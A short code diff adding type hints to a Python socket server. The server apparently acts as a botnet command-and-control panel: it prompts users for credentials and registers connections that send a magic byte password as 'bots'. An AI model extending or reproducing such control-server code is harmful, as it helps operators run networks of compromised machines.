@@ -81,10 +81,11 @@ def update_title(
 
 
 
-def handle_client(client, address):
-    
+def handle_client(
+    client: Sock,
+    address: tuple[str, int],
+) -> None:
     log("handleclient\n")
-    
     while 1:
         send(client, config.ANSI_CLEAR, False)
         send(client, f'{config.COLOR_WHITE}Username > ', False)
@@ -102,7 +103,7 @@ def handle_client(client, address):
             password = client.recv(1024).decode('cp1252').strip()
 
         break
-        
+
     if password != '\xff\xff\xff\xff\75':
         send(client, config.ANSI_CLEAR, False)
 
@@ -116,9 +117,7 @@ def handle_client(client, address):
 
     else: config.bots.update({client: address})
 
-
-
-def main():
+def main() -> None:
     port: int = None
 
     if config.relay_addr.RELAY_PORT != None: port = config.relay_addr.RELAY_PORT
